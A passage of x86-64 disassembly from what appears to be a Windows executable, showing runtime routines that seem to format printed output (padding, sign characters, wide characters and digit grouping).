   140006acc:	48 8b 0d 15 57 38 00 	mov    0x385715(%rip),%rcx        # 0x14038c1e8
   140006ad3:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140006ad8:	ff 15 06 68 38 00    	call   *0x386806(%rip)        # 0x14038d2e4
   140006ade:	85 c0                	test   %eax,%eax
   140006ae0:	0f 84 94 fe ff ff    	je     0x14000697a
   140006ae6:	f0 83 2d f2 56 38 00 	lock subl $0x1,0x3856f2(%rip)        # 0x14038c1e0
   140006aed:	01 
   140006aee:	e9 87 fe ff ff       	jmp    0x14000697a
   140006af3:	e8 80 4f 00 00       	call   0x14000ba78
   140006af8:	90                   	nop
   140006af9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006b00:	48 39 11             	cmp    %rdx,(%rcx)
   140006b03:	73 0b                	jae    0x140006b10
   140006b05:	48 89 11             	mov    %rdx,(%rcx)
   140006b08:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140006b0f:	00 
   140006b10:	4c 39 41 08          	cmp    %r8,0x8(%rcx)
   140006b14:	73 04                	jae    0x140006b1a
   140006b16:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140006b1a:	4d 85 c9             	test   %r9,%r9
   140006b1d:	74 05                	je     0x140006b24
   140006b1f:	48 39 11             	cmp    %rdx,(%rcx)
   140006b22:	74 04                	je     0x140006b28
   140006b24:	c3                   	ret
   140006b25:	0f 1f 00             	nopl   (%rax)
   140006b28:	4c 89 49 18          	mov    %r9,0x18(%rcx)
   140006b2c:	c3                   	ret
   140006b2d:	90                   	nop
   140006b2e:	90                   	nop
   140006b2f:	90                   	nop
   140006b30:	56                   	push   %rsi
   140006b31:	53                   	push   %rbx
   140006b32:	48 83 ec 38          	sub    $0x38,%rsp
   140006b36:	48 85 d2             	test   %rdx,%rdx
   140006b39:	48 89 ce             	mov    %rcx,%rsi
   140006b3c:	74 42                	je     0x140006b80
   140006b3e:	48 8d 5a ff          	lea    -0x1(%rdx),%rbx
   140006b42:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006b47:	48 89 ca             	mov    %rcx,%rdx
   140006b4a:	4d 89 c1             	mov    %r8,%r9
   140006b4d:	31 c9                	xor    %ecx,%ecx
   140006b4f:	41 89 d8             	mov    %ebx,%r8d
   140006b52:	e8 89 19 00 00       	call   0x1400084e0
   140006b57:	39 c3                	cmp    %eax,%ebx
   140006b59:	7f 15                	jg     0x140006b70
   140006b5b:	48 63 d3             	movslq %ebx,%rdx
   140006b5e:	48 01 d2             	add    %rdx,%rdx
   140006b61:	31 c9                	xor    %ecx,%ecx
   140006b63:	66 89 0c 16          	mov    %cx,(%rsi,%rdx,1)
   140006b67:	48 83 c4 38          	add    $0x38,%rsp
   140006b6b:	5b                   	pop    %rbx
   140006b6c:	5e                   	pop    %rsi
   140006b6d:	c3                   	ret
   140006b6e:	66 90                	xchg   %ax,%ax
   140006b70:	48 63 d0             	movslq %eax,%rdx
   140006b73:	48 01 d2             	add    %rdx,%rdx
   140006b76:	eb e9                	jmp    0x140006b61
   140006b78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140006b7f:	00 
   140006b80:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006b85:	48 89 ca             	mov    %rcx,%rdx
   140006b88:	4d 89 c1             	mov    %r8,%r9
   140006b8b:	31 c9                	xor    %ecx,%ecx
   140006b8d:	45 31 c0             	xor    %r8d,%r8d
   140006b90:	e8 4b 19 00 00       	call   0x1400084e0
   140006b95:	48 83 c4 38          	add    $0x38,%rsp
   140006b99:	5b                   	pop    %rbx
   140006b9a:	5e                   	pop    %rsi
   140006b9b:	c3                   	ret
   140006b9c:	90                   	nop
   140006b9d:	90                   	nop
   140006b9e:	90                   	nop
   140006b9f:	90                   	nop
   140006ba0:	53                   	push   %rbx
   140006ba1:	48 83 ec 20          	sub    $0x20,%rsp
   140006ba5:	44 8b 42 08          	mov    0x8(%rdx),%r8d
   140006ba9:	41 f7 c0 00 40 00 00 	test   $0x4000,%r8d
   140006bb0:	48 89 d3             	mov    %rdx,%rbx
   140006bb3:	75 08                	jne    0x140006bbd
   140006bb5:	8b 42 24             	mov    0x24(%rdx),%eax
   140006bb8:	39 42 28             	cmp    %eax,0x28(%rdx)
   140006bbb:	7e 18                	jle    0x140006bd5
   140006bbd:	41 81 e0 00 20 00 00 	and    $0x2000,%r8d
   140006bc4:	48 8b 13             	mov    (%rbx),%rdx
   140006bc7:	75 18                	jne    0x140006be1
   140006bc9:	4c 63 43 24          	movslq 0x24(%rbx),%r8
   140006bcd:	4c 89 c0             	mov    %r8,%rax
   140006bd0:	66 42 89 0c 42       	mov    %cx,(%rdx,%r8,2)
   140006bd5:	83 c0 01             	add    $0x1,%eax
   140006bd8:	89 43 24             	mov    %eax,0x24(%rbx)
   140006bdb:	48 83 c4 20          	add    $0x20,%rsp
   140006bdf:	5b                   	pop    %rbx
   140006be0:	c3                   	ret
   140006be1:	0f b7 c9             	movzwl %cx,%ecx
   140006be4:	e8 af 4e 00 00       	call   0x14000ba98
   140006be9:	8b 43 24             	mov    0x24(%rbx),%eax
   140006bec:	83 c0 01             	add    $0x1,%eax
   140006bef:	89 43 24             	mov    %eax,0x24(%rbx)
   140006bf2:	48 83 c4 20          	add    $0x20,%rsp
   140006bf6:	5b                   	pop    %rbx
   140006bf7:	c3                   	ret
   140006bf8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140006bff:	00 
   140006c00:	41 54                	push   %r12
   140006c02:	55                   	push   %rbp
   140006c03:	57                   	push   %rdi
   140006c04:	56                   	push   %rsi
   140006c05:	53                   	push   %rbx
   140006c06:	48 83 ec 60          	sub    $0x60,%rsp
   140006c0a:	41 8b 78 10          	mov    0x10(%r8),%edi
   140006c0e:	39 d7                	cmp    %edx,%edi
   140006c10:	48 89 ce             	mov    %rcx,%rsi
   140006c13:	4c 89 c3             	mov    %r8,%rbx
   140006c16:	0f 8d 09 01 00 00    	jge    0x140006d25
   140006c1c:	85 ff                	test   %edi,%edi
   140006c1e:	0f 88 01 01 00 00    	js     0x140006d25
   140006c24:	8b 43 08             	mov    0x8(%rbx),%eax
   140006c27:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   140006c2b:	89 c2                	mov    %eax,%edx
   140006c2d:	81 e2 00 60 00 00    	and    $0x6000,%edx
   140006c33:	81 fa 00 60 00 00    	cmp    $0x6000,%edx
   140006c39:	0f 84 f1 00 00 00    	je     0x140006d30
   140006c3f:	44 39 c7             	cmp    %r8d,%edi
   140006c42:	7c 7c                	jl     0x140006cc0
   140006c44:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140006c4b:	48 8d 6c 24 38       	lea    0x38(%rsp),%rbp
   140006c50:	85 ff                	test   %edi,%edi
   140006c52:	4c 8d 64 24 40       	lea    0x40(%rsp),%r12
   140006c57:	7f 22                	jg     0x140006c7b
   140006c59:	e9 af 00 00 00       	jmp    0x140006d0d
   140006c5e:	66 90                	xchg   %ax,%ax
   140006c60:	0f b7 4c 24 40       	movzwl 0x40(%rsp),%ecx
   140006c65:	0f b7 c9             	movzwl %cx,%ecx
   140006c68:	48 89 da             	mov    %rbx,%rdx
   140006c6b:	48 01 c6             	add    %rax,%rsi
   140006c6e:	e8 2d ff ff ff       	call   0x140006ba0
   140006c73:	85 ff                	test   %edi,%edi
   140006c75:	0f 84 92 00 00 00    	je     0x140006d0d
   140006c7b:	48 89 f1             	mov    %rsi,%rcx
   140006c7e:	48 c7 45 00 00 00 00 	movq   $0x0,0x0(%rbp)
   140006c85:	00 
   140006c86:	83 ef 01             	sub    $0x1,%edi
   140006c89:	e8 62 4e 00 00       	call   0x14000baf0
   140006c8e:	49 89 e9             	mov    %rbp,%r9
   140006c91:	48 89 f2             	mov    %rsi,%rdx
   140006c94:	4c 89 e1             	mov    %r12,%rcx
   140006c97:	49 89 c0             	mov    %rax,%r8
   140006c9a:	e8 81 4b 00 00       	call   0x14000b820
   140006c9f:	48 85 c0             	test   %rax,%rax
   140006ca2:	74 69                	je     0x140006d0d
   140006ca4:	79 ba                	jns    0x140006c60
   140006ca6:	66 0f be 0e          	movsbw (%rsi),%cx
   140006caa:	b8 01 00 00 00       	mov    $0x1,%eax
   140006caf:	66 89 4c 24 40       	mov    %cx,0x40(%rsp)
   140006cb4:	eb af                	jmp    0x140006c65
   140006cb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140006cbd:	00 00 00 
   140006cc0:	41 29 f8             	sub    %edi,%r8d
   140006cc3:	f6 c4 04             	test   $0x4,%ah
   140006cc6:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
   140006cca:	0f 85 7b ff ff ff    	jne    0x140006c4b
   140006cd0:	41 83 e8 01          	sub    $0x1,%r8d
   140006cd4:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
   140006cd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140006cdf:	00 
   140006ce0:	48 89 da             	mov    %rbx,%rdx
   140006ce3:	b9 20 00 00 00       	mov    $0x20,%ecx
   140006ce8:	e8 b3 fe ff ff       	call   0x140006ba0
   140006ced:	8b 43 0c             	mov    0xc(%rbx),%eax
   140006cf0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140006cf3:	85 c0                	test   %eax,%eax
   140006cf5:	89 53 0c             	mov    %edx,0xc(%rbx)
   140006cf8:	75 e6                	jne    0x140006ce0
   140006cfa:	e9 4c ff ff ff       	jmp    0x140006c4b
   140006cff:	90                   	nop
   140006d00:	48 89 da             	mov    %rbx,%rdx
   140006d03:	b9 20 00 00 00       	mov    $0x20,%ecx
   140006d08:	e8 93 fe ff ff       	call   0x140006ba0
   140006d0d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140006d10:	8d 50 ff             	lea    -0x1(%rax),%edx
   140006d13:	85 c0                	test   %eax,%eax
   140006d15:	89 53 0c             	mov    %edx,0xc(%rbx)
   140006d18:	7f e6                	jg     0x140006d00
   140006d1a:	48 83 c4 60          	add    $0x60,%rsp
   140006d1e:	5b                   	pop    %rbx
   140006d1f:	5e                   	pop    %rsi
   140006d20:	5f                   	pop    %rdi
   140006d21:	5d                   	pop    %rbp
   140006d22:	41 5c                	pop    %r12
   140006d24:	c3                   	ret
   140006d25:	89 d7                	mov    %edx,%edi
   140006d27:	e9 f8 fe ff ff       	jmp    0x140006c24
   140006d2c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006d30:	44 39 c7             	cmp    %r8d,%edi
   140006d33:	48 8b 0b             	mov    (%rbx),%rcx
   140006d36:	7d 32                	jge    0x140006d6a
   140006d38:	f6 c4 04             	test   $0x4,%ah
   140006d3b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006d40:	41 89 f9             	mov    %edi,%r9d
   140006d43:	75 39                	jne    0x140006d7e
   140006d45:	48 8d 15 e4 29 38 00 	lea    0x3829e4(%rip),%rdx        # 0x140389730
   140006d4c:	e8 57 4d 00 00       	call   0x14000baa8
   140006d51:	85 c0                	test   %eax,%eax
   140006d53:	7e 03                	jle    0x140006d58
   140006d55:	01 43 24             	add    %eax,0x24(%rbx)
   140006d58:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140006d5f:	48 83 c4 60          	add    $0x60,%rsp
   140006d63:	5b                   	pop    %rbx
   140006d64:	5e                   	pop    %rsi
   140006d65:	5f                   	pop    %rdi
   140006d66:	5d                   	pop    %rbp
   140006d67:	41 5c                	pop    %r12
   140006d69:	c3                   	ret
   140006d6a:	48 8d 15 d9 29 38 00 	lea    0x3829d9(%rip),%rdx        # 0x14038974a
   140006d71:	49 89 f1             	mov    %rsi,%r9
   140006d74:	41 89 f8             	mov    %edi,%r8d
   140006d77:	e8 2c 4d 00 00       	call   0x14000baa8
   140006d7c:	eb d3                	jmp    0x140006d51
   140006d7e:	48 8d 15 b7 29 38 00 	lea    0x3829b7(%rip),%rdx        # 0x14038973c
   140006d85:	e8 1e 4d 00 00       	call   0x14000baa8
   140006d8a:	eb c5                	jmp    0x140006d51
   140006d8c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006d90:	48 83 ec 38          	sub    $0x38,%rsp
   140006d94:	45 8b 58 08          	mov    0x8(%r8),%r11d
   140006d98:	85 c9                	test   %ecx,%ecx
   140006d9a:	41 c7 40 10 ff ff ff 	movl   $0xffffffff,0x10(%r8)
   140006da1:	ff 
   140006da2:	74 40                	je     0x140006de4
   140006da4:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   140006da9:	c6 44 24 2c 2d       	movb   $0x2d,0x2c(%rsp)
   140006dae:	4c 8d 51 01          	lea    0x1(%rcx),%r10
   140006db2:	41 83 e3 20          	and    $0x20,%r11d
   140006db6:	45 31 c9             	xor    %r9d,%r9d
   140006db9:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140006dbe:	83 e0 df             	and    $0xffffffdf,%eax
   140006dc1:	44 09 d8             	or     %r11d,%eax
   140006dc4:	43 88 04 0a          	mov    %al,(%r10,%r9,1)
   140006dc8:	49 83 c1 01          	add    $0x1,%r9
   140006dcc:	49 83 f9 03          	cmp    $0x3,%r9
   140006dd0:	75 e7                	jne    0x140006db9
   140006dd2:	49 8d 52 03          	lea    0x3(%r10),%rdx
   140006dd6:	48 29 ca             	sub    %rcx,%rdx
   140006dd9:	e8 22 fe ff ff       	call   0x140006c00
   140006dde:	90                   	nop
   140006ddf:	48 83 c4 38          	add    $0x38,%rsp
   140006de3:	c3                   	ret
   140006de4:	41 f7 c3 00 01 00 00 	test   $0x100,%r11d
   140006deb:	74 13                	je     0x140006e00
   140006ded:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   140006df2:	c6 44 24 2c 2b       	movb   $0x2b,0x2c(%rsp)
   140006df7:	4c 8d 51 01          	lea    0x1(%rcx),%r10
   140006dfb:	eb b5                	jmp    0x140006db2
   140006dfd:	0f 1f 00             	nopl   (%rax)
   140006e00:	41 f6 c3 40          	test   $0x40,%r11b
   140006e04:	74 1a                	je     0x140006e20
   140006e06:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   140006e0b:	c6 44 24 2c 20       	movb   $0x20,0x2c(%rsp)
   140006e10:	4c 8d 51 01          	lea    0x1(%rcx),%r10
   140006e14:	eb 9c                	jmp    0x140006db2
   140006e16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140006e1d:	00 00 00 
   140006e20:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   140006e25:	49 89 ca             	mov    %rcx,%r10
   140006e28:	eb 88                	jmp    0x140006db2
   140006e2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006e30:	56                   	push   %rsi
   140006e31:	53                   	push   %rbx
   140006e32:	48 83 ec 38          	sub    $0x38,%rsp
   140006e36:	83 79 14 fd          	cmpl   $0xfffffffd,0x14(%rcx)
   140006e3a:	48 89 cb             	mov    %rcx,%rbx
   140006e3d:	74 21                	je     0x140006e60
   140006e3f:	0f b7 49 18          	movzwl 0x18(%rcx),%ecx
   140006e43:	66 85 c9             	test   %cx,%cx
   140006e46:	48 89 da             	mov    %rbx,%rdx
   140006e49:	75 05                	jne    0x140006e50
   140006e4b:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140006e50:	e8 4b fd ff ff       	call   0x140006ba0
   140006e55:	90                   	nop
   140006e56:	48 83 c4 38          	add    $0x38,%rsp
   140006e5a:	5b                   	pop    %rbx
   140006e5b:	5e                   	pop    %rsi
   140006e5c:	c3                   	ret
   140006e5d:	0f 1f 00             	nopl   (%rax)
   140006e60:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140006e67:	00 00 
   140006e69:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
   140006e6e:	e8 45 4c 00 00       	call   0x14000bab8
   140006e73:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   140006e78:	49 89 f1             	mov    %rsi,%r9
   140006e7b:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140006e81:	48 8b 10             	mov    (%rax),%rdx
   140006e84:	e8 97 49 00 00       	call   0x14000b820
   140006e89:	85 c0                	test   %eax,%eax
   140006e8b:	7e 13                	jle    0x140006ea0
   140006e8d:	0f b7 4c 24 26       	movzwl 0x26(%rsp),%ecx
   140006e92:	66 89 4b 18          	mov    %cx,0x18(%rbx)
   140006e96:	89 43 14             	mov    %eax,0x14(%rbx)
   140006e99:	eb a8                	jmp    0x140006e43
   140006e9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006ea0:	0f b7 4b 18          	movzwl 0x18(%rbx),%ecx
   140006ea4:	eb f0                	jmp    0x140006e96
   140006ea6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140006ead:	00 00 00 
   140006eb0:	55                   	push   %rbp
   140006eb1:	57                   	push   %rdi
   140006eb2:	56                   	push   %rsi
   140006eb3:	53                   	push   %rbx
   140006eb4:	48 83 ec 38          	sub    $0x38,%rsp
   140006eb8:	41 8b 68 10          	mov    0x10(%r8),%ebp
   140006ebc:	39 d5                	cmp    %edx,%ebp
   140006ebe:	48 89 ce             	mov    %rcx,%rsi
   140006ec1:	4c 89 c3             	mov    %r8,%rbx
   140006ec4:	0f 8d d6 00 00 00    	jge    0x140006fa0
   140006eca:	85 ed                	test   %ebp,%ebp
   140006ecc:	0f 88 ce 00 00 00    	js     0x140006fa0
   140006ed2:	8b 43 08             	mov    0x8(%rbx),%eax
   140006ed5:	44 8b 43 0c          	mov    0xc(%rbx),%r8d
   140006ed9:	89 c2                	mov    %eax,%edx
   140006edb:	81 e2 00 60 00 00    	and    $0x6000,%edx
   140006ee1:	81 fa 00 60 00 00    	cmp    $0x6000,%edx
   140006ee7:	0f 84 d8 00 00 00    	je     0x140006fc5
   140006eed:	8d 7d ff             	lea    -0x1(%rbp),%edi
   140006ef0:	41 39 e8             	cmp    %ebp,%r8d
   140006ef3:	7f 6e                	jg     0x140006f63
   140006ef5:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140006efc:	85 ed                	test   %ebp,%ebp
   140006efe:	0f 8e 1b 01 00 00    	jle    0x14000701f
   140006f04:	0f b7 0e             	movzwl (%rsi),%ecx
   140006f07:	66 85 c9             	test   %cx,%cx
   140006f0a:	75 0f                	jne    0x140006f1b
   140006f0c:	eb 3f                	jmp    0x140006f4d
   140006f0e:	66 90                	xchg   %ax,%ax
   140006f10:	0f b7 0e             	movzwl (%rsi),%ecx
   140006f13:	83 ef 01             	sub    $0x1,%edi
   140006f16:	66 85 c9             	test   %cx,%cx
   140006f19:	74 32                	je     0x140006f4d
   140006f1b:	48 89 da             	mov    %rbx,%rdx
   140006f1e:	48 83 c6 02          	add    $0x2,%rsi
   140006f22:	e8 79 fc ff ff       	call   0x140006ba0
   140006f27:	85 ff                	test   %edi,%edi
   140006f29:	7f e5                	jg     0x140006f10
   140006f2b:	8b 43 0c             	mov    0xc(%rbx),%eax
   140006f2e:	8d 50 ff             	lea    -0x1(%rax),%edx
   140006f31:	85 c0                	test   %eax,%eax
   140006f33:	89 53 0c             	mov    %edx,0xc(%rbx)
   140006f36:	7e 22                	jle    0x140006f5a
   140006f38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140006f3f:	00 
   140006f40:	48 89 da             	mov    %rbx,%rdx
   140006f43:	b9 20 00 00 00       	mov    $0x20,%ecx
   140006f48:	e8 53 fc ff ff       	call   0x140006ba0
   140006f4d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140006f50:	8d 50 ff             	lea    -0x1(%rax),%edx
   140006f53:	85 c0                	test   %eax,%eax
   140006f55:	89 53 0c             	mov    %edx,0xc(%rbx)
   140006f58:	7f e6                	jg     0x140006f40
   140006f5a:	48 83 c4 38          	add    $0x38,%rsp
   140006f5e:	5b                   	pop    %rbx
   140006f5f:	5e                   	pop    %rsi
   140006f60:	5f                   	pop    %rdi
   140006f61:	5d                   	pop    %rbp
   140006f62:	c3                   	ret
   140006f63:	41 29 e8             	sub    %ebp,%r8d
   140006f66:	f6 c4 04             	test   $0x4,%ah
   140006f69:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
   140006f6d:	75 41                	jne    0x140006fb0
   140006f6f:	41 83 e8 01          	sub    $0x1,%r8d
   140006f73:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
   140006f77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140006f7e:	00 00 
   140006f80:	48 89 da             	mov    %rbx,%rdx
   140006f83:	b9 20 00 00 00       	mov    $0x20,%ecx
   140006f88:	e8 13 fc ff ff       	call   0x140006ba0
   140006f8d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140006f90:	8d 50 ff             	lea    -0x1(%rax),%edx
   140006f93:	85 c0                	test   %eax,%eax
   140006f95:	89 53 0c             	mov    %edx,0xc(%rbx)
   140006f98:	75 e6                	jne    0x140006f80
   140006f9a:	e9 5d ff ff ff       	jmp    0x140006efc
   140006f9f:	90                   	nop
   140006fa0:	89 d5                	mov    %edx,%ebp
   140006fa2:	e9 2b ff ff ff       	jmp    0x140006ed2
   140006fa7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140006fae:	00 00 
   140006fb0:	85 ed                	test   %ebp,%ebp
   140006fb2:	0f 8f 4c ff ff ff    	jg     0x140006f04
   140006fb8:	41 83 e8 01          	sub    $0x1,%r8d
   140006fbc:	44 89 43 0c          	mov    %r8d,0xc(%rbx)
   140006fc0:	e9 7b ff ff ff       	jmp    0x140006f40
   140006fc5:	41 39 e8             	cmp    %ebp,%r8d
   140006fc8:	48 8b 0b             	mov    (%rbx),%rcx
   140006fcb:	7e 30                	jle    0x140006ffd
   140006fcd:	f6 c4 04             	test   $0x4,%ah
   140006fd0:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140006fd5:	41 89 e9             	mov    %ebp,%r9d
   140006fd8:	75 37                	jne    0x140007011
   140006fda:	48 8d 15 73 27 38 00 	lea    0x382773(%rip),%rdx        # 0x140389754
   140006fe1:	e8 c2 4a 00 00       	call   0x14000baa8
   140006fe6:	85 c0                	test   %eax,%eax
   140006fe8:	7e 03                	jle    0x140006fed
   140006fea:	01 43 24             	add    %eax,0x24(%rbx)
   140006fed:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140006ff4:	48 83 c4 38          	add    $0x38,%rsp
   140006ff8:	5b                   	pop    %rbx
   140006ff9:	5e                   	pop    %rsi
   140006ffa:	5f                   	pop    %rdi
   140006ffb:	5d                   	pop    %rbp
   140006ffc:	c3                   	ret
   140006ffd:	48 8d 15 6a 27 38 00 	lea    0x38276a(%rip),%rdx        # 0x14038976e
   140007004:	49 89 f1             	mov    %rsi,%r9
   140007007:	41 89 e8             	mov    %ebp,%r8d
   14000700a:	e8 99 4a 00 00       	call   0x14000baa8
   14000700f:	eb d5                	jmp    0x140006fe6
   140007011:	48 8d 15 48 27 38 00 	lea    0x382748(%rip),%rdx        # 0x140389760
   140007018:	e8 8b 4a 00 00       	call   0x14000baa8
   14000701d:	eb c7                	jmp    0x140006fe6
   14000701f:	c7 43 0c fe ff ff ff 	movl   $0xfffffffe,0xc(%rbx)
   140007026:	e9 2f ff ff ff       	jmp    0x140006f5a
   14000702b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007030:	41 54                	push   %r12
   140007032:	55                   	push   %rbp
   140007033:	57                   	push   %rdi
   140007034:	56                   	push   %rsi
   140007035:	53                   	push   %rbx
   140007036:	48 83 ec 20          	sub    $0x20,%rsp
   14000703a:	45 85 c0             	test   %r8d,%r8d
   14000703d:	89 cd                	mov    %ecx,%ebp
   14000703f:	48 89 d7             	mov    %rdx,%rdi
   140007042:	41 8b 49 0c          	mov    0xc(%r9),%ecx
   140007046:	44 89 c6             	mov    %r8d,%esi
   140007049:	4c 89 cb             	mov    %r9,%rbx
   14000704c:	0f 8e 41 02 00 00    	jle    0x140007293
   140007052:	41 39 c8             	cmp    %ecx,%r8d
   140007055:	0f 8f c5 00 00 00    	jg     0x140007120
   14000705b:	44 29 c1             	sub    %r8d,%ecx
   14000705e:	41 89 49 0c          	mov    %ecx,0xc(%r9)
   140007062:	8b 43 10             	mov    0x10(%rbx),%eax
   140007065:	39 c1                	cmp    %eax,%ecx
   140007067:	0f 8f a5 01 00 00    	jg     0x140007212
   14000706d:	85 f6                	test   %esi,%esi
   14000706f:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140007076:	7e 0a                	jle    0x140007082
   140007078:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
   14000707c:	0f 85 b1 00 00 00    	jne    0x140007133
   140007082:	85 ed                	test   %ebp,%ebp
   140007084:	0f 85 58 01 00 00    	jne    0x1400071e2
   14000708a:	8b 43 08             	mov    0x8(%rbx),%eax
   14000708d:	f6 c4 01             	test   $0x1,%ah
   140007090:	0f 85 da 02 00 00    	jne    0x140007370
   140007096:	a8 40                	test   $0x40,%al
   140007098:	0f 85 45 03 00 00    	jne    0x1400073e3
   14000709e:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400070a1:	85 c0                	test   %eax,%eax
   1400070a3:	7e 15                	jle    0x1400070ba
   1400070a5:	8b 53 08             	mov    0x8(%rbx),%edx
   1400070a8:	81 e2 00 06 00 00    	and    $0x600,%edx
   1400070ae:	81 fa 00 02 00 00    	cmp    $0x200,%edx
   1400070b4:	0f 84 c8 02 00 00    	je     0x140007382
   1400070ba:	4c 8d 63 20          	lea    0x20(%rbx),%r12
   1400070be:	85 f6                	test   %esi,%esi
   1400070c0:	bd ab aa aa aa       	mov    $0xaaaaaaab,%ebp
   1400070c5:	0f 8e 15 02 00 00    	jle    0x1400072e0
   1400070cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400070d0:	0f b6 07             	movzbl (%rdi),%eax
   1400070d3:	b9 30 00 00 00       	mov    $0x30,%ecx
   1400070d8:	84 c0                	test   %al,%al
   1400070da:	74 07                	je     0x1400070e3
   1400070dc:	48 83 c7 01          	add    $0x1,%rdi
   1400070e0:	0f be c8             	movsbl %al,%ecx
   1400070e3:	48 89 da             	mov    %rbx,%rdx
   1400070e6:	e8 b5 fa ff ff       	call   0x140006ba0
   1400070eb:	83 ee 01             	sub    $0x1,%esi
   1400070ee:	0f 84 00 01 00 00    	je     0x1400071f4
   1400070f4:	f6 43 09 10          	testb  $0x10,0x9(%rbx)
   1400070f8:	74 d6                	je     0x1400070d0
   1400070fa:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   1400070ff:	74 cf                	je     0x1400070d0
   140007101:	89 f0                	mov    %esi,%eax
   140007103:	f7 e5                	mul    %ebp
   140007105:	d1 ea                	shr    $1,%edx
   140007107:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   14000710a:	39 c6                	cmp    %eax,%esi
   14000710c:	75 c2                	jne    0x1400070d0
   14000710e:	49 89 d8             	mov    %rbx,%r8
   140007111:	ba 01 00 00 00       	mov    $0x1,%edx
   140007116:	4c 89 e1             	mov    %r12,%rcx
   140007119:	e8 92 fd ff ff       	call   0x140006eb0
   14000711e:	eb b0                	jmp    0x1400070d0
   140007120:	41 f6 41 09 10       	testb  $0x10,0x9(%r9)
   140007125:	41 c7 41 0c ff ff ff 	movl   $0xffffffff,0xc(%r9)
   14000712c:	ff 
   14000712d:	0f 84 4f ff ff ff    	je     0x140007082
   140007133:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   140007138:	0f 84 44 ff ff ff    	je     0x140007082
   14000713e:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140007143:	8d 56 02             	lea    0x2(%rsi),%edx
   140007146:	41 b8 ab aa aa aa    	mov    $0xaaaaaaab,%r8d
   14000714c:	89 d0                	mov    %edx,%eax
   14000714e:	41 f7 e0             	mul    %r8d
   140007151:	d1 ea                	shr    $1,%edx
   140007153:	83 fa 01             	cmp    $0x1,%edx
   140007156:	74 2d                	je     0x140007185
   140007158:	85 c9                	test   %ecx,%ecx
   14000715a:	0f 8e 22 ff ff ff    	jle    0x140007082
   140007160:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140007163:	29 d1                	sub    %edx,%ecx
   140007165:	8d 51 01             	lea    0x1(%rcx),%edx
   140007168:	eb 12                	jmp    0x14000717c
   14000716a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007170:	83 e8 01             	sub    $0x1,%eax
   140007173:	83 f8 ff             	cmp    $0xffffffff,%eax
   140007176:	0f 84 79 02 00 00    	je     0x1400073f5
   14000717c:	39 c2                	cmp    %eax,%edx
   14000717e:	89 c1                	mov    %eax,%ecx
   140007180:	75 ee                	jne    0x140007170
   140007182:	89 43 0c             	mov    %eax,0xc(%rbx)
   140007185:	85 c9                	test   %ecx,%ecx
   140007187:	0f 8e f5 fe ff ff    	jle    0x140007082
   14000718d:	85 ed                	test   %ebp,%ebp
   14000718f:	0f 85 1b 01 00 00    	jne    0x1400072b0
   140007195:	8b 43 08             	mov    0x8(%rbx),%eax
   140007198:	a9 c0 01 00 00       	test   $0x1c0,%eax
   14000719d:	0f 84 0d 02 00 00    	je     0x1400073b0
   1400071a3:	83 e9 01             	sub    $0x1,%ecx
   1400071a6:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   1400071a9:	0f 84 de fe ff ff    	je     0x14000708d
   1400071af:	f6 c4 06             	test   $0x6,%ah
   1400071b2:	0f 85 d5 fe ff ff    	jne    0x14000708d
